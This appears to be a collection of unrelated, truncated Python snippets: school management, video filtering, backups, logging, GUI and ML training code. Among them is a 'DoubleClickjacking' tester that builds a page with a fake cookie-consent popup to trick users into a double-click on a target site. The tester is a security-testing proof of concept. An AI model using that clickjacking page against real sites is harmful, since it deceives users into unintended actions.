[username:{self.username}], my_password is [password:{self.password}]'\n                send_to_satellite = self.candidate_access_satellite\n                target_ip = send_to_satellite.ip_address\n                wait_time = 5\n                data_size = 0.1\n            else:\n                # \u7528\u6237\u6b63\u5728\u641c\u7d22\u5408\u9002\u7684\u536b\u661f\u63a5\u5165\n                # print('Users are searching for suitable access satellites !!')\n                await asyncio.sleep(3)\n                continue\n            data_signal = await Stack.create_message_to_bits(message=message, source_ip=self.ip_address, target_ip=target_ip\n                                               ",
    "from database_sys import *\r\n########################################################################\r\n## GITHUB : https://github.com/Bita404/School-Backend-System\r\n#####################################################################\r\n\r\n##>>>>>>>>>>>>>>>>>>  main menu provides 5 other menus for each class <<<<<<<<<<<<<<<<<<<<<<<<<<<<<\r\n\r\ndef main_menu():\r\n    while True:\r\n        print(\"\\n<<<<<  WELCOME TO THE SCHOOL SYSTEM  >>>>>\")\r\n        print(\"xX=========== Main Menu ===========Xx\")\r\n        print(\"\\n1. Manage Classes\")\r\n        print(\"2. Manage Students\")\r\n        print(\"3. Manage Teachers\")\r\n        print(\"4. Manage Courses\")\r\n        print(\"5. Generate Reports and Visualization\")\r\n        print(\"6. Advanced Search\")\r\n        print(\"7. Exit\")\r\n\r\n        choice = input(\"\\nEnter your choice: \")\r\n        if choice == \"1\":\r\n            class_menu()\r\n        elif choice == \"2\":\r\n            student_menu()\r\n        elif choice == \"3\":\r\n            teacher_menu()\r\n        elif choice == \"4\":\r\n            course_menu()\r\n        elif choice == \"5\":\r\n            report_menu()\r\n        elif choice == \"6\":\r\n            perform_advanced_search()   \r\n        elif choice == \"7\":\r\n            print(\"ok...Exiting the program.... bye bye o(\u2565\ufe4f\u2565) !\")\r\n            break\r\n        else:\r\n            print(\"womp womp ! Invalid choice! try valid options ! ! \")\r\n\r\n#>>>>>>>>>>>>>>>>..........................................CLASS MENU................................            \r\ndef class_menu():\r\n    while True:\r\n        print(\"\\n=====> Class Management <=====\")\r\n        print(\"\\n1. Add a New Class\")\r\n        print(\"2. Update Class Details\")\r\n        print(\"3. Delete a Class\")\r\n        print(\"4. Show All Classes\")\r\n        print(\"5. Search for a Class\")\r\n        print(\"6. Back to Main Menu\")\r\n        #>......................................ADD CLASS\r\n        choice = input(\"\\nEnter your choice: \")\r\n        if choice == \"1\":\r\n            class_id = input(\"Enter an ID for the Class: \")\r\n            class_name = input(\"Enter Class Name: \")\r\n            class_capacity = int(input(\"Enter Class Capacity: \"))\r\n            try:\r\n               C = Class(dbb ,class_id, class_name, class_capacity)\r\n               C.add_class()\r\n            except ValueError as e:\r\n                print(e)\r\n         #>......................................EDIT CLASS       \r\n        elif choice == \"2\":\r\n            class_id =input(\"Enter The class ID that you want to Update: \")\r\n            field = input(\"Enter The field To Update: \")\r\n            value =input(\"Enter The new Value: \")\r\n            try:  \r\n                 if field == \"class_capacity\":\r\n                    value = int(value)\r\n                     \r\n                 C = Class(dbb , class_id, \"\" , 0 )\r\n                 C.edit_class(class_id , field, value)\r\n                 \r\n            except ValueError as e: \r\n                print(e) \r\n          #>........................................REMOVE CLASS        \r\n        elif choice == \"3\":\r\n            class_id = input(\"Enter The class ID to delete: \")\r\n            try:\r\n               C = Class(dbb , class_id, \"\" , 0 )\r\n               C.remove_class(class_id)\r\n            except ValueError as e :\r\n                print(e)   \r\n           #>........................................DISPLAY CLASSES TABLE\r\n        elif choice == \"4\":           \r\n            query = \"SELECT * FROM classes\"\r\n            result = dbb.execute_query(query, fetch=True)\r\n            if result:\r\n                print(\"\\nAll Classes: \")\r\n                for row in result:\r\n                  print(row)\r\n            else :\r\n                print(\"No Class Found !\")      \r\n         #>..........................................SEARCH \r\n        elif choice == \"5\":\r\n            class_id=input(\"Enter the class ID to search: \")\r\n            C= Class(dbb , class_id , \"\" , 0)\r\n            C.search_class(class_id)\r\n\r\n         #>.........................................BACK TO MAIN MENU \r\n        elif choice == \"6\":\r\n            break\r\n        else:\r\n            print(\"womp womp ! Invalid choice!\")\r\n          \r\n  #>>>>>>>>>>>......................>>>>>>>>>>>   STUDENT MENU   ....<<<<<<<<<<<<<<<<<<<<...................          \r\ndef student_menu():\r\n    while True:\r\n        print(\"\\n=====> Student Management <=====\")\r\n        print(\"\\n1. Add a New Student\")\r\n        print(\"2. Update Student Details\")\r\n        print(\"3. Delete a Student\")\r\n        print(\"4. Show All Students\")\r\n        print(\"5. Search for a Student\")\r\n        print(\"6. Back to Main Menu\")\r\n\r\n        choice = input(\"\\nEnter your choice: \")\r\n      #>>>>>>...............................ADD STUDENT  \r\n        if choice == \"1\":\r\n            name =input(\"Enter Student name: \")\r\n            age = int(input(\"Enter Student Age: \"))\r\n            email = input(\"Enter student Email:\")\r\n            grade = int(input(\"Enter student Grade: \"))\r\n            class_id =input(\"Enter Student class ID: \")\r\n            student_id=input(\"En",
    "import os\nimport sys\nimport cv2\nimport random\nfrom PIL import Image, ImageTk\nimport subprocess\nimport multiprocessing\nfrom multiprocessing import Process, cpu_count, freeze_support\nimport shutil\nimport time\nimport tkinter as tk\nfrom tkinter import ttk, filedialog, messagebox\n\ndef get_video_fps(video_path):\n    \"\"\"Gets the FPS of a video file.\"\"\"\n    vidcap = cv2.VideoCapture(video_path)\n    fps = vidcap.get(cv2.CAP_PROP_FPS)\n    vidcap.release()\n    return fps\n\ndef extract_frames_with_ffmpeg(video_path, output_folder, fps):\n    \"\"\"Extracts frames from a video file using ffmpeg.\"\"\"\n    if not os.path.exists(output_folder):\n        os.makedirs(output_folder)\n    else:\n        # Ensure the folder is empty\n        for filename in os.listdir(output_folder):\n            file_path = os.path.join(output_folder, filename)\n            if os.path.isfile(file_path) or os.path.islink(file_path):\n                os.unlink(file_path)\n            elif os.path.isdir(file_path):\n                shutil.rmtree(file_path)\n\n    command = f\"ffmpeg -y -i {video_path} -vf fps={fps} {output_folder}/frame%06d.jpg\"\n    subprocess.call(command, shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)\n\ndef probably(prob):\n    \"\"\"Returns True with a probability equal to `prob`.\"\"\"\n    return random.random() < prob\n\ndef apply_filter(image, compression, effect, milk_type, calidad, frame_path):\n    \"\"\"Applies a custom filter to an image.\"\"\"\n    if effect:\n        punt = 70\n    else:\n        punt = 100\n\n    imag = image.convert('RGB')\n    nombre = os.path.splitext(os.path.basename(frame_path))[0]\n\n    if compression:\n        output_folder = 'filtered_frames'\n        if not os.path.exists(output_folder):\n            os.makedirs(output_folder)\n        output_path = os.path.join(output_folder, f\"{nombre}.jpg\")\n        imag.save(output_path, quality=100-calidad)\n        imag = Image.open(output_path)\n\n    width, height = imag.size\n\n    for x in range(width):\n        for y in range(height):\n            pixelRGB = imag.getpixel((x, y))\n            R, G, B = pixelRGB\n            brightness = sum([R, G, B]) / 3\n            new_pixel = (0, 0, 0, 255)\n\n            if milk_type == 1:\n                if brightness <= 25:\n                    new_pixel = (0, 0, 0, 255)\n                elif brightness <= 70:\n                    new_pixel = (0, 0, 0, 255) if probably(punt/100) else (102, 0, 31, 255)\n                elif brightness < 120:\n                    new_pixel = (102, 0, 31, 255) if probably(punt/100) else (0, 0, 0, 255)\n                elif brightness < 200:\n                    new_pixel = (102, 0, 31, 255)\n                elif brightness < 230:\n                    new_pixel = (137, 0, 146, 255) if probably(punt/100) else (102, 0, 31, 255)\n                else:\n                    new_pixel = (137, 0, 146, 255)\n            else:\n                if brightness <= 25:\n                    new_pixel = (0, 0, 0, 255)\n                elif brightness <= 70:\n                    new_pixel = (0, 0, 0, 255) if probably(punt/100) else (92, 36, 60, 255)\n                elif brightness < 90:\n                    new_pixel = (92, 36, 60, 255) if probably(punt/100) else (0, 0, 0, 255)\n                elif brightness < 150:\n                    new_pixel = (92, 36, 60, 255)\n                elif brightness < 200:\n                    new_pixel = (203, 43, 43, 255) if probably(punt/100) else (92, 36, 60, 255)\n                else:\n                    new_pixel = (203, 43, 43, 255)\n\n            imag.putpixel((x, y), new_pixel)\n\n    return imag\n\ndef apply_filter_to_frame_range(start, end, input_folder, output_folder, compression, effect, milk_type, quality):\n    \"\"\"Applies the filter to a range of frames and saves them to the output folder.\"\"\"\n    for frame_num in range(start, end):\n        frame_path = os.path.join(input_folder, f\"frame{frame_num:06d}.jpg\")\n        if os.path.exists(frame_path):\n            image = Image.open(frame_path)\n            filtered_image = apply_filter(image, compression, effect, milk_type, quality, frame_path)\n            filtered_frame_path = os.path.join(output_folder, f\"frame{frame_num:06d}.jpg\")\n            filtered_image.save(filtered_frame_path)\n\ndef apply_filter_to_frames(input_folder, output_folder, compression=False, effect=False, milk_type=1, quality=90, progress_callback=None):\n    \"\"\"Applies the custom filter to each extracted frame and saves them to the output folder.\"\"\"\n    if not os.path.exists(output_folder):\n        os.makedirs(output_folder)\n    else:\n        # Ensure the folder is empty\n        for filename in os.listdir(output_folder):\n            file_path = os.path.join(output_folder, filename)\n            if os.path.isfile(file_path) or os.path.islink(file_path):\n                os.unlink(file_path)\n            elif os.path.isdir(file_path):\n                shutil.rmtree(file_path)\n\n    frame_files = [f for f in os.listdir(input_folder) if f.endswith('.jpg')]\n    frame_files.sort(key=lambda x: int(x[5:-4]))\n    to",
    "logo = \"\"\"\r\n\r\n\r\n\u2588\u2588   \u2588\u2588 \u2588\u2588  \u2588\u2588\u2588\u2588\u2588\u2588  \u2588\u2588   \u2588\u2588 \u2588\u2588\u2588\u2588\u2588\u2588\u2588 \u2588\u2588\u2588\u2588\u2588\u2588       \u2588\u2588\u2588\u2588\u2588  \u2588\u2588\u2588    \u2588\u2588 \u2588\u2588\u2588\u2588\u2588\u2588      \r\n\u2588\u2588   \u2588\u2588 \u2588\u2588 \u2588\u2588       \u2588\u2588   \u2588\u2588 \u2588\u2588      \u2588\u2588   \u2588\u2588     \u2588\u2588   \u2588\u2588 \u2588\u2588\u2588\u2588   \u2588\u2588 \u2588\u2588   \u2588\u2588     \r\n\u2588\u2588\u2588\u2588\u2588\u2588\u2588 \u2588\u2588 \u2588\u2588   \u2588\u2588\u2588 \u2588\u2588\u2588\u2588\u2588\u2588\u2588 \u2588\u2588\u2588\u2588\u2588   \u2588\u2588\u2588\u2588\u2588\u2588      \u2588\u2588\u2588\u2588\u2588\u2588\u2588 \u2588\u2588 \u2588\u2588  \u2588\u2588 \u2588\u2588   \u2588\u2588     \r\n\u2588\u2588   \u2588\u2588 \u2588\u2588 \u2588\u2588    \u2588\u2588 \u2588\u2588   \u2588\u2588 \u2588\u2588      \u2588\u2588   \u2588\u2588     \u2588\u2588   \u2588\u2588 \u2588\u2588  \u2588\u2588 \u2588\u2588 \u2588\u2588   \u2588\u2588     \r\n\u2588\u2588   \u2588\u2588 \u2588\u2588  \u2588\u2588\u2588\u2588\u2588\u2588  \u2588\u2588   \u2588\u2588 \u2588\u2588\u2588\u2588\u2588\u2588\u2588 \u2588\u2588   \u2588\u2588     \u2588\u2588   \u2588\u2588 \u2588\u2588   \u2588\u2588\u2588\u2588 \u2588\u2588\u2588\u2588\u2588\u2588      \r\n                                                                                           \r\n        \u2588\u2588       \u2588\u2588\u2588\u2588\u2588\u2588  \u2588\u2588     \u2588\u2588 \u2588\u2588\u2588\u2588\u2588\u2588\u2588 \u2588\u2588\u2588\u2588\u2588\u2588       \u2588\u2588\u2588\u2588\u2588\u2588   \u2588\u2588\u2588\u2588\u2588  \u2588\u2588\u2588    \u2588\u2588\u2588 \u2588\u2588\u2588\u2588\u2588\u2588\u2588 \r\n        \u2588\u2588      \u2588\u2588    \u2588\u2588 \u2588\u2588     \u2588\u2588 \u2588\u2588      \u2588\u2588   \u2588\u2588     \u2588\u2588       \u2588\u2588   \u2588\u2588 \u2588\u2588\u2588\u2588  \u2588\u2588\u2588\u2588 \u2588\u2588      \r\n        \u2588\u2588      \u2588\u2588    \u2588\u2588 \u2588\u2588  \u2588  \u2588\u2588 \u2588\u2588\u2588\u2588\u2588   \u2588\u2588\u2588\u2588\u2588\u2588      \u2588\u2588   \u2588\u2588\u2588 \u2588\u2588\u2588\u2588\u2588\u2588\u2588 \u2588\u2588 \u2588\u2588\u2588\u2588 \u2588\u2588 \u2588\u2588\u2588\u2588\u2588   \r\n        \u2588\u2588      \u2588\u2588    \u2588\u2588 \u2588\u2588 \u2588\u2588\u2588 \u2588\u2588 \u2588\u2588      \u2588\u2588   \u2588\u2588     \u2588\u2588    \u2588\u2588 \u2588\u2588   \u2588\u2588 \u2588\u2588  \u2588\u2588  \u2588\u2588 \u2588\u2588      \r\n        \u2588\u2588\u2588\u2588\u2588\u2588\u2588  \u2588\u2588\u2588\u2588\u2588\u2588   \u2588\u2588\u2588 \u2588\u2588\u2588  \u2588\u2588\u2588\u2588\u2588\u2588\u2588 \u2588\u2588   \u2588\u2588      \u2588\u2588\u2588\u2588\u2588\u2588  \u2588\u2588   \u2588\u2588 \u2588\u2588      \u2588\u2588 \u2588\u2588\u2588\u2588\u2588\u2588\u2588                                                                                                      \r\n\"\"\"\r\n\r\nvs = \"\"\"\r\n\u2588\u2588    \u2588\u2588 \u2588\u2588\u2588\u2588\u2588\u2588\u2588 \r\n\u2588\u2588    \u2588\u2588 \u2588\u2588      \r\n\u2588\u2588    \u2588\u2588 \u2588\u2588\u2588\u2588\u2588\u2588\u2588 \r\n \u2588\u2588  \u2588\u2588       \u2588\u2588 \r\n  \u2588\u2588\u2588\u2588   \u2588\u2588\u2588\u2588\u2588\u2588\u2588 \r\n\"\"\"",
    "from datetime import datetime\r\nimport time\r\nfrom main import create_cli, save_text, create_info\r\nimport subprocess\r\nimport os\r\nimport json\r\nimport requests\r\n\r\ntry:\r\n    cdatetime = datetime.now()\r\n    bkfoldername = f\"BK-{save_text(cdatetime.strftime('%d-%m-%Y'))}\"\r\n    passwd = open(\r\n        r\"/path/to/password.txt\",\r\n        \"r\",\r\n        encoding=\"utf-8\",\r\n    ).read()\r\n    clistr = rf'7z a -spf -mx9 -md128m -ms16g -mhe -p{passwd} \"/path/to/backups/{bkfoldername}/backup.7z\" /main/ '\r\n    logs = str(open(r\"/path/to/logs.txt\", \"r\").read()).replace(\"$LATEST|\", \"\")\r\n    info_file = r\"/path/to/info.txt\"\r\n\r\n    open(r\"/path/to/k.txt\", \"w\").write(f\"$LATEST|{bkfoldername}/n------/n\" + logs)\r\n\r\n    backups = os.listdir(r\"/path/to/backups\")\r\n\r\n    if len(backups) >= 150:\r\n        print(\"WARN: Too many backups\")\r\n\r\n    subprocess.run(\"schtasks /End /TN Autorun\")\r\n    time.sleep(1)\r\n    subprocess.run(\r\n        create_cli(\r\n            r\"/path/to/.ignorefile\",\r\n            r\"/path/to/.allowedfile\",\r\n            clistr,\r\n        ),\r\n    )\r\n\r\n    info = create_info(\r\n        cdatetime, info_file, rf'\"/path/to/backups/{bkfoldername}/backup.7z\"', passwd\r\n    )\r\n    subprocess.run(\"schtasks /Run /TN Autorun\")\r\n\r\n    dc_webhook = json.loads(\r\n        open(\r\n            r\"/path/to/discord_hook.json\"\r\n        ).read()\r\n    )\r\n    for id in dc_webhook[\"embeds\"]:\r\n        if id[\"id\"] == 131227103:\r\n            for fields in id[\"fields\"]:\r\n                if fields[\"value\"] == \"{allowedfileread}\":\r\n                    fields[\"value\"] = str(\r\n                        open(\r\n                            r\"/path/to/.allowedfile\"\r\n                        ).read()\r\n                    ).replace(\"name\", \"\\\\???\")\r\n\r\n                if fields[\"value\"] == \"{ignoredfileread}\":\r\n                    fields[\"value\"] = (\r\n                        str(\r\n                            open(\r\n                                r\"/path/to/.ignorefile\"\r\n                            ).read()\r\n                        )\r\n                        .replace(\"name\", \"\\\\???\")\r\n                        .replace(\r\n                            r\"/path/to/password.txt\",\r\n                            \"\",\r\n                        )\r\n                    )\r\n\r\n        if id[\"id\"] == 10674342:\r\n            id[\"description\"] = info.replace(\"name\", \"\")\r\n\r\n    requests.post(\r\n        \"https://discord.com/api/webhooks/REDACTED\",\r\n        json=dc_webhook,\r\n    )\r\n\r\nexcept Exception as e:\r\n    dc_webhook = json.loads(\r\n        open(\r\n            r\"/path/to/discord_hook_failed.json\"\r\n        ).read()\r\n    )\r\n    for id in dc_webhook[\"embeds\"]:\r\n        if id[\"description\"] == \"{info}\":\r\n            id[\"description\"] = (\r\n                f\"Failed at time: {datetime.now().isoformat()}./nError: {e}\"\r\n            )\r\n\r\n    requests.post(\r\n        \"https://discord.com/api/webhooks/REDACTED\",\r\n        json=dc_webhook,\r\n    )\r\n    \r\n    \r\n    ",
    "import logging\nimport os\n\n\nclass LoggerFactory:\n    \"\"\"Factory class to set up and configure a logger with customizable log level and format.\n\n    This class ensures that logging is configured only once during the application's lifetime.\n    It can configure the logger based on a given name, logging level, and logging format.\n\n    Attributes:\n        logger_name (str): The name of the logger to create.\n        log_level (int): The logging level (e.g., logging.INFO, logging.DEBUG).\n        log_format (str): The format for log messages.\n        logger (logging.Logger): The configured logger instance.\n\n    Methods:\n        get_logger():\n            Returns the configured logger instance.\n        configure_from_env(logger_name, env_var=\"LOG_LEVEL\"):\n            Configures the logger based on an environment variable for dynamic log level setting.\n    \"\"\"\n\n    _is_logger_initialized: bool = False\n\n    def __init__(\n        self,\n        logger_name: str,\n        log_level: int = logging.INFO,\n        log_format: str = \"%(asctime)s - %(levelname)s - %(message)s\",\n    ) -> None:\n        \"\"\"Initialize the LoggerFactory instance with the given logger name, log level, and format.\n\n        Args:\n            logger_name (str): The name of the logger to create.\n            log_level (int, optional): The logging level to use (default is logging.INFO).\n            log_format (str, optional): The format for log messages (default is\n                                        \"%(asctime)s - %(levelname)s - %(message)s\").\n        \"\"\"\n        self.logger_name = logger_name\n        self.log_level = log_level\n        self.log_format = log_format\n        self.logger = self._initialize_logger()\n\n    def _initialize_logger(self) -> logging.Logger:\n        \"\"\"Configure the logger with the given name and log level.\n\n        Returns:\n            logging.Logger: A configured logger instance.\n        \"\"\"\n        if not self._is_logger_initialized:\n            logging.basicConfig(level=self.log_level, format=self.log_format)\n            self._is_logger_initialized = True\n\n        return logging.getLogger(self.logger_name)\n\n    def get_logger(self) -> logging.Logger:\n        \"\"\"Return the configured logger instance.\n\n        Returns:\n            logging.Logger: The logger instance.\n        \"\"\"\n        return self.logger\n\n    @staticmethod\n    def configure_from_env(logger_name: str, env_var: str = \"LOG_LEVEL\") -> \"LoggerFactory\":\n        \"\"\"Configure the logger based on an environment variable for dynamic log level setting.\n\n        Args:\n            logger_name (str): The name of the logger to create.\n            env_var (str, optional): The environment variable to retrieve the log level from (default is \"LOG_LEVEL\").\n\n        Returns:\n            LoggerFactory: A LoggerFactory instance with the log level set based on the environment variable.\n        \"\"\"\n        log_level_str = os.getenv(env_var, \"INFO\").upper()\n        # Default to INFO if invalid level\n        log_level = getattr(logging, log_level_str, logging.INFO)\n        return LoggerFactory(logger_name, log_level=log_level)\n",
    "\n## Source to remember\n## Explains how to enable text field and disable again to run programatically\n## https://stackoverflow.com/questions/10817917/how-to-disable-input-to-a-text-widget-but-allow-programmatic-input\n\nimport tkinter as tk\n\nclass mainwindow:\n\n    def __init__(self):\n\n        self.root = tk.Tk()\n        \n        ##\n        ## Sets basic parameters  for window\n        ##\n        self.root.title(\"Target Tracker\")   ## sets title\n        self.root.geometry(\"800x200\")       ## sets sizes\n        self.root.configure(bg=\"#0070BB\")   ## sets background color\n\n        ##\n        ## Sets top headings for table\n        ##\n        self.targetA = tk.Label(self.root, text=\"Target A\", font=(\"@Kozuka Mincho Pro B\", 18, \"bold\"), bg=\"#0070BB\", fg=\"white\") ## A target Heading\n        self.targetA.grid(column=0, row=0, padx=5, pady=5,) ## places into window\n\n        self.targetB = tk.Label(self.root, text=\"Target B\", font=(\"@Kozuka Mincho Pro B\", 18, \"bold\"), bg=\"#0070BB\", fg=\"white\") ## B target Heading\n        self.targetB.grid(column=1, row=0, padx=10, pady=5,) ## places into window\n\n        self.targetC = tk.Label(self.root, text=\"Target C\", font=(\"@Kozuka Mincho Pro B\", 18, \"bold\"), bg=\"#0070BB\", fg=\"white\") ## C Target Heading\n        self.targetC.grid(column=2, row=0, padx=10, pady=5,) ## places into window\n\n        self.targetD = tk.Label(self.root, text=\"Target D\", font=(\"@Kozuka Mincho Pro B\", 18, \"bold\"), bg=\"#0070BB\", fg=\"white\") ## D target Heading\n        self.targetD.grid(column=3, row=0, padx=10, pady=5,) ## places into window\n\n        ##\n        ## Entry Field for sales target A\n        ##\n        self.aEntry = tk.IntVar() ## variable which takes information from Entry Label\n        self.targetAEntry = tk.Entry(self.root, font=(\"Arial\", 14),textvariable=self.aEntry) ## Creates Entry Field\n        self.targetAEntry.grid(column=0, row=1, padx=5, pady=5, sticky=\"NEWS\") ## Places into window\n\n        ##\n        ## Text fields for holding calculations of different targets\n        ##\n        self.targetBTextBox = tk.Text(self.root, font=(\"Arial\", 14), height=1, width=15)    ## Creates text box for holding B Target\n        self.targetBTextBox.configure(state=\"disabled\")                                     ## disables ability for user to enter information\n        self.targetBTextBox.grid(column=1, row=1, padx=5, pady=5, sticky=\"NEWS\")            ## Places into window\n\n        self.targetCTextBox = tk.Text(self.root, font=(\"Arial\", 14), height=1, width=15)    ## Creates text box for holding C Target\n        self.targetCTextBox.configure(state=\"disabled\")                                     ## Disables ability for user to enter information\n        self.targetCTextBox.grid(column=2, row=1, padx=5, pady=5, sticky=\"NEWS\")            ## Places into window\n\n        self.targetDTextBox = tk.Text(self.root, font=(\"Arial\", 14), height=1, width=15)    ## Creates text box for holding D Target\n        self.targetDTextBox.configure(state=\"disabled\")                                     ## Disables ability for user to enter information\n        self.targetDTextBox.grid(column=3, row=1, padx=5, pady=5, sticky=\"NEWS\")            ## Places into window\n\n        ##\n        ## Labels for holding difference between different targets\n        ##\n        self.diffBoxB = tk.Label(self.root, font=(\"@Kozuka Mincho Pro B\", 18, \"bold\"), text=\"\", bg=\"#0070BB\", fg=\"#3FFF00\") ## Label for storing difference between A and B Target (Blank on initialisation)\n        self.diffBoxB.grid(column=1, row=3, padx=0, pady=0) ## Places into window\n\n        self.diffBoxC = tk.Label(self.root, font=(\"@Kozuka Mincho Pro B\", 18, \"bold\"), text=\"\", bg=\"#0070BB\", fg=\"#3FFF00\") ## Label for storing difference between B and C Target (Blank on initialisation)\n        self.diffBoxC.grid(column=2, row=3, padx=0, pady=0) ## Places into window\n\n        self.diffBoxD = tk.Label(self.root, font=(\"@Kozuka Mincho Pro B\", 18, \"bold\"), text=\"\", bg=\"#0070BB\", fg=\"#3FFF00\") ## Label for storing difference between C and D Target (Blank on initialisation)\n        self.diffBoxD.grid(column=3, row=3, padx=0, pady=0) ## Places into window\n\n        ##\n        ## run button for starting calculations\n        ##\n        self.runButton = tk.Button(self.root, text=\"Run\", font=(\"Arial\", 18), command=self.targetCalculations) ## Creates button with on click command to begin calculations\n        self.runButton.grid(column=0, row=4, padx=5, pady=10, sticky=\"NEWS\") ## Places into window\n\n        ## sets area where window ends\n        self.root.mainloop()\n    \n\n    def targetCalculations(self): \n\n        ## Retrieves A target variable from window\n        aTarget = self.aEntry.get()\n\n        ## Calculates B target\n        ## Formats Text\n        bTarget = aTarget * 1.10\n        bFormatted = f\"{bTarget:,.2f}\"\n\n        ## Calculates difference between B target and A target\n        ## Formats text\n        bDifference = bTarget - aTarget\n        bDifferenceFormatted = f\"+{bDifference:,.2f}\"\n\n ",
    "import os\nimport sys\nimport webbrowser\n\nif len(sys.argv) != 2:\n    print('\\n[+] Description: %s verifies if a web page is vulnerable to DoubleClickjacking' % __file__)\n    print('[+] Usage: python %s <url>\\n' % __file__)\n    exit(0)\n\nurl = sys.argv[1]\n\nhtml = f'''\n<html>\n    <head>\n        <title>DoubleClickjacking Test</title>\n        <style>\n            body {{\n                font-family: Arial, sans-serif;\n                text-align: center;\n                margin: 0;\n                padding: 0;\n            }}\n            .container {{\n                margin-top: 50px;\n            }}\n            .log {{\n                margin-top: 20px;\n                font-family: monospace;\n                text-align: left;\n                display: inline-block;\n                padding: 10px;\n                border: 1px solid #ccc;\n                width: 80%;\n                background-color: #f9f9f9;\n            }}\n            #start-button {{\n                font-size: 20px;\n                padding: 10px 20px;\n                background-color: #007bff;\n                color: white;\n                border: none;\n                border-radius: 5px;\n                cursor: pointer;\n            }}\n            #start-button:hover {{\n                background-color: #0056b3;\n            }}\n        </style>\n        <script>\n            function logAction(message) {{\n                const logDiv = document.getElementById('log');\n                const timestamp = new Date().toLocaleTimeString();\n                const logMessage = `[${{timestamp}}] ${{message}}`;\n                logDiv.innerHTML += logMessage + '<br>';\n\n                // Store the log in localStorage\n                const existingLog = localStorage.getItem('attackLog') || '';\n                localStorage.setItem('attackLog', existingLog + logMessage + '\\\\n');\n            }}\n\n            function restoreLog() {{\n                const logDiv = document.getElementById('log');\n                const storedLog = localStorage.getItem('attackLog');\n                if (storedLog) {{\n                    logDiv.innerHTML = storedLog.replace(/\\\\n/g, '<br>');\n                }}\n            }}\n\n            function startAttack() {{\n                logAction(\"Test started. Redirecting parent page to target page...\");\n                window.location = '{url}';\n\n                logAction(\"Opening simulated cookie consent pop-up...\");\n                // Open a simulated cookie consent pop-up\n                const attackerWindow = window.open('', 'attackerWindow', 'width=400,height=300');\n                attackerWindow.document.write(`\n                    <html>\n                    <head>\n                        <title>Cookie Consent</title>\n                        <style>\n                            body {{\n                                font-family: Arial, sans-serif;\n                                text-align: center;\n                                padding-top: 100px;\n                                margin: 0;\n                                background-color: #f9f9f9;\n                            }}\n                            button {{\n                                font-size: 16px;\n                                margin: 10px;\n                                padding: 10px 20px;\n                                color: white;\n                                background-color: #007bff;\n                                border: none;\n                                border-radius: 5px;\n                                cursor: pointer;\n                            }}\n                            button:hover {{\n                                background-color: #0056b3;\n                            }}\n                        </style>\n                    </head>\n                    <body>\n                        <h2>Cookie Consent</h2>\n                        <p>Double-click \"Accept Cookies\" to continue.</p>\n                        <button onclick=\"\n                            try {{\n                                if (window.opener) {{\n                                    // window.opener.logAction('User double-clicked Accept Cookies. Redirecting parent window to the target page...');\n                                    window.close();\n                                }}\n                            }} catch (e) {{\n                                alert('Error: Unable to communicate with parent window.');\n                            }}\n                            window.close();\n                        \">Accept Cookies</button>\n                        <button onclick=\"window.close()\">Decline Cookies</button>\n                    </body>\n                    </html>\n                `);\n\n                logAction(\"Pop-up launched. Waiting for user interaction...\");\n            }}\n\n            window.onload = restoreLog;\n        </script>\n    </head>\n    <body>\n        <div class=\"container\">\n            <h1>DoubleClickjacking Test</h1>\n            <button id=\"start-button\" onclick=\"startAtta",
    "import pathlib\nimport re\nimport numpy as np\n\n\ndef filter_annotations_low_score(image_annotations, thresh):\n    new_image_annotations = []\n    for anno in image_annotations:\n        img_filtered_annotations = {}\n        relevant_annotation_indices = [\n            i for i, s in enumerate(anno['score']) if s >= thresh\n        ]\n        for key in anno.keys():\n            img_filtered_annotations[key] = (\n                anno[key][relevant_annotation_indices])\n        new_image_annotations.append(img_filtered_annotations)\n    return new_image_annotations\n\n\ndef get_label_annotation(label_path):\n    annotations = {}\n    annotations.update({\n        'name': [],\n        'truncated': [],\n        'occluded': [],\n        'alpha': [],\n        'bbox': [],\n        'dimensions': [],\n        'location': [],\n        'rotation_y': []\n    })\n    with open(label_path, 'r') as f:\n        lines = f.readlines()\n    # if len(lines) == 0 or len(lines[0]) < 15:\n    #     content = []\n    # else:\n    content = [line.strip().split(' ') for line in lines]\n    annotations['name'] = np.array([x[0] for x in content])\n    annotations['truncated'] = np.array([float(x[1]) for x in content])\n    annotations['occluded'] = np.array([int(x[2]) for x in content])\n    annotations['alpha'] = np.array([float(x[3]) for x in content])\n    annotations['bbox'] = np.array(\n        [[float(info) for info in x[4:8]] for x in content]).reshape(-1, 4)\n    # dimensions will convert hwl format to standard lhw(camera) format.\n    annotations['dimensions'] = np.array(\n        [[float(info) for info in x[8:11]] for x in content]).reshape(\n        -1, 3)[:, [2, 0, 1]]\n    annotations['location'] = np.array(\n        [[float(info) for info in x[11:14]] for x in content]).reshape(-1, 3)\n    annotations['rotation_y'] = np.array(\n        [float(x[14]) for x in content]).reshape(-1)\n    if len(content) != 0 and len(content[0]) == 16:  # have score\n        annotations['score'] = np.array([float(x[15]) for x in content])\n    else:\n        annotations['score'] = np.zeros([len(annotations['bbox'])])\n    return annotations\n\n\ndef get_label_annotations(label_folder, image_ids=None):\n    if image_ids is None:\n        filepaths = pathlib.Path(label_folder).glob('*.txt')\n        prog = re.compile(r'^\\d{5}.txt$')\n        filepaths = filter(lambda f: prog.match(f.name), filepaths)\n        image_ids = [int(p.stem) for p in filepaths]\n        image_ids = sorted(image_ids)\n    if not isinstance(image_ids, list):\n        image_ids = list(range(image_ids))\n    annos = []\n    label_folder = pathlib.Path(label_folder)\n    for idx in image_ids:\n        label_filename = label_folder / (idx + '.txt')\n        annos.append(get_label_annotation(label_filename))\n    return annos",
    "from os.path import dirname, join, basename, isfile\nfrom tqdm import tqdm\nimport torch.autograd as autograd\n\nfrom models import SyncNet_color as SyncNet\nfrom models import Wav2Lip, Wav2Lip_disc_qual\nimport audio\n\nimport torch\nfrom torch import nn\nfrom torch.nn import functional as F\nfrom torch import optim\nimport torch.backends.cudnn as cudnn\nfrom torch.utils import data as data_utils\nimport numpy as np\n\nfrom glob import glob\nimport torch.multiprocessing as mp\nimport torch.distributed as dist\nimport os, random, cv2, argparse\nfrom hparams import hparams, get_image_list\n\nparser = argparse.ArgumentParser(description='Code to train the Wav2Lip model WITH the visual quality discriminator')\n\nparser.add_argument(\"--data_root\", help=\"Root folder of the preprocessed LRS2 dataset\", required=True, type=str)\n\nparser.add_argument('--checkpoint_dir', help='Save checkpoints to this directory', required=True, type=str)\nparser.add_argument('--syncnet_checkpoint_path', help='Load the pre-trained Expert discriminator', required=True, type=str)\n\nparser.add_argument('--checkpoint_path', help='Resume generator from this checkpoint', default=None, type=str)\nparser.add_argument('--disc_checkpoint_path', 